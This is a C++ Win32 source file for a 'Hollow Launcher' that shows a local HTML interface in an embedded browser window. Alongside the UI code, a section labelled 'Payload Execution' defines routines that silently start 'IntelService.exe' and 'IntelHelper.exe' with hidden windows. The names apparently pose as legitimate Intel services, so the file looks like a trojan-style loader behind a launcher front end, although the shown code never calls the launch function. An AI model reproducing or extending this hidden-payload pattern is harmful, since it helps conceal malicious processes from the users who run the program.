#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <exdisp.h>
#include <mshtml.h>
#include <olectl.h>
#include <string>
#include <fstream>
#include <sstream>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "user32.lib")

using namespace std;

// Payload Execution
void RunHidden(const string& exePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(
        NULL,
        (LPSTR)exePath.c_str(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void LaunchPayloads() {
    RunHidden("IntelService.exe");
    RunHidden("IntelHelper.exe");
}

// Get absolute path to nui/index.html
wstring GetNuiPath() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wstring path(exePath);
    size_t lastSlash = path.find_last_of(L"\\/");
    if (lastSlash != wstring::npos) {
        path = path.substr(0, lastSlash);
    }
    return L"file:///" + path + L"/nui/index.html";
}

// OLE Storage & Client Site Implementation
class SimpleWebClientSite : public IOleClientSite, public IOleInPlaceSite, public IOleInPlaceFrame {
    LONG m_cRef;
public:
    HWND m_hWnd;

    SimpleWebClientSite(HWND hWnd) : m_cRef(1), m_hWnd(hWnd) {}

    // IUnknown
    STDMETHODIMP QueryInterface(REFIID riid, void** ppv) {
        if (riid == IID_IUnknown || riid == IID_IOleClientSite) *ppv = (IOleClientSite*)this;
        else if (riid == IID_IOleInPlaceSite) *ppv = (IOleInPlaceSite*)this;
        else if (riid == IID_IOleInPlaceFrame) *ppv = (IOleInPlaceFrame*)this;
        else { *ppv = NULL; return E_NOINTERFACE; }
        AddRef();
        return S_OK;
    }
    STDMETHODIMP_(ULONG) AddRef() { return InterlockedIncrement(&m_cRef); }
    STDMETHODIMP_(ULONG) Release() {
        ULONG count = InterlockedDecrement(&m_cRef);
        if (count == 0) delete this;
        return count;
    }

    // IOleClientSite
    STDMETHODIMP SaveObject() { return E_NOTIMPL; }
    STDMETHODIMP GetMoniker(DWORD, DWORD, IMoniker**) { return E_NOTIMPL; }
    STDMETHODIMP GetContainer(IOleContainer** pp) { *pp = NULL; return E_NOINTERFACE; }
    STDMETHODIMP ShowObject() { return S_OK; }
    STDMETHODIMP OnShowWindow(BOOL) { return S_OK; }
    STDMETHODIMP RequestNewObjectLayout() { return E_NOTIMPL; }

    // IOleInPlaceSite
    STDMETHODIMP GetWindow(HWND* phwnd) { *phwnd = m_hWnd; return S_OK; }
    STDMETHODIMP ContextSensitiveHelp(BOOL) { return E_NOTIMPL; }
    STDMETHODIMP CanInPlaceActivate() { return S_OK; }
    STDMETHODIMP OnInPlaceActivate() { return S_OK; }
    STDMETHODIMP OnUIActivate() { return S_OK; }
    STDMETHODIMP GetWindowContext(IOleInPlaceFrame** ppFrame, IOleInPlaceUIWindow** ppDoc, LPRECT prcPos, LPRECT prcClip, LPOLEINPLACEFRAMEINFO pInfo) {
        *ppFrame = (IOleInPlaceFrame*)this;
        (*ppFrame)->AddRef();
        *ppDoc = NULL;
        GetClientRect(m_hWnd, prcPos);
        GetClientRect(m_hWnd, prcClip);
        pInfo->cb = sizeof(OLEINPLACEFRAMEINFO);
        pInfo->fMDIApp = FALSE;
        pInfo->hwndFrame = m_hWnd;
        pInfo->haccel = NULL;
        pInfo->cAccelEntries = 0;
        return S_OK;
    }
    STDMETHODIMP Scroll(SIZE) { return E_NOTIMPL; }
    STDMETHODIMP OnUIDeactivate(BOOL) { return S_OK; }
    STDMETHODIMP OnInPlaceDeactivate() { return S_OK; }
    STDMETHODIMP DiscardUndoState() { return E_NOTIMPL; }
    STDMETHODIMP DeactivateAndUndo() { return E_NOTIMPL; }
    STDMETHODIMP OnPosRectChange(LPCRECT) { return S_OK; }

    // IOleInPlaceFrame
    STDMETHODIMP GetBorder(LPRECT) { return E_NOTIMPL; }
    STDMETHODIMP RequestBorderSpace(LPCBORDERWIDTHS) { return E_NOTIMPL; }
    STDMETHODIMP SetBorderSpace(LPCBORDERWIDTHS) { return E_NOTIMPL; }
    STDMETHODIMP SetActiveObject(IOleInPlaceActiveObject*, LPCOLESTR) { return S_OK; }
    STDMETHODIMP InsertMenus(HMENU, LPOLEMENUGROUPWIDTHS) { return E_NOTIMPL; }
    STDMETHODIMP SetMenu(HMENU, HOLEMENU, HWND) { return S_OK; }
    STDMETHODIMP RemoveMenus(HMENU) { return E_NOTIMPL; }
    STDMETHODIMP SetStatusText(LPCOLESTR) { return S_OK; }
    STDMETHODIMP EnableModeless(BOOL) { return S_OK; }
    STDMETHODIMP TranslateAccelerator(LPMSG, WORD) { return E_NOTIMPL; }
};

IWebBrowser2* pWebBrowser = NULL;
IOleObject* pOleObject = NULL;

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        SimpleWebClientSite* pSite = new SimpleWebClientSite(hWnd);
        IStorage* pStg = NULL;
        StgCreateDocfile(NULL, STGM_READWRITE | STGM_SHARE_EXCLUSIVE | STGM_CREATE | STGM_DELETEONRELEASE, 0, &pStg);
        HRESULT hr = OleCreate(CLSID_WebBrowser, IID_IOleObject, OLERENDER_DRAW, NULL, pSite, pStg, (void**)&pOleObject);
        if (pStg) pStg->Release();
        if (SUCCEEDED(hr)) {
            pOleObject->SetHostNames(L"HollowLauncherHost", NULL);
            OleSetContainedObject(pOleObject, TRUE);

            RECT rc;
            GetClientRect(hWnd, &rc);
            pOleObject->DoVerb(OLEIVERB_SHOW, NULL, pSite, 0, hWnd, &rc);

            pOleObject->QueryInterface(IID_IWebBrowser2, (void**)&pWebBrowser);
            if (pWebBrowser) {
                pWebBrowser->put_RegisterAsDropTarget(VARIANT_FALSE);
                pWebBrowser->put_Silent(VARIANT_TRUE);

                wstring url = GetNuiPath();
                VARIANT vUrl;
                VariantInit(&vUrl);
                vUrl.vt = VT_BSTR;
                vUrl.bstrVal = SysAllocString(url.c_str());

                pWebBrowser->Navigate2(&vUrl, NULL, NULL, NULL, NULL);
                VariantClear(&vUrl);
            }
        }
        break;
    }
    case WM_SIZE: {
        if (pOleObject) {
            RECT rc;
            GetClientRect(hWnd, &rc);
            IOleInPlaceObject* pInPlace = NULL;
            pOleObject->QueryInterface(IID_IOleInPlaceObject, (void**)&pInPlace);
            if (pInPlace) {
                pInPlace->SetObjectRects(&rc, &rc);
                pInPlace->Release();
            }
        }
        break;
    }
    case WM_NCHITTEST: {
        LRESULT hit = DefWindowProcW(hWnd, msg, wParam, lParam);
        if (hit == HTCLIENT) {
            POINT pt = { LOWORD(lParam), HIWORD(lParam) };
            ScreenToClient(hWnd, &pt);
            if (pt.y <= 42) {
                return HTCAPTION;
            }
        }
        return hit;
    }
    case WM_DESTROY:
        if (pWebBrowser) { pWebBrowser->Release(); pWebBrowser = NULL; }
        if (pOleObject) { pOleObject->Close(OLECLOSE_NOSAVE); pOleObject->Release(); pOleObject = NULL; }
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmd, int nShow) {
    OleInitialize(NULL);

    WNDCLASSEXW wc = { sizeof(wc) };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"HollowLauncherWebNUIClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClassExW(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int winW = 480;
    int winH = 320;
    int posX = (screenW - winW) / 2;
    int posY = (screenH - winH) / 2;

    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        wc.lpszClassName,
        L"Hollow Launcher NUI",
        WS_POPUP | WS_VISIBLE,
        posX, posY, winW, winH,
        NULL, NULL, hInst, NULL
    );

    HRGN hRgn = CreateRoundRectRgn(0, 0, winW, winH, 14, 14);
    SetWindowRgn(hWnd, hRgn, TRUE);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    OleUninitialize();
    return 0;
}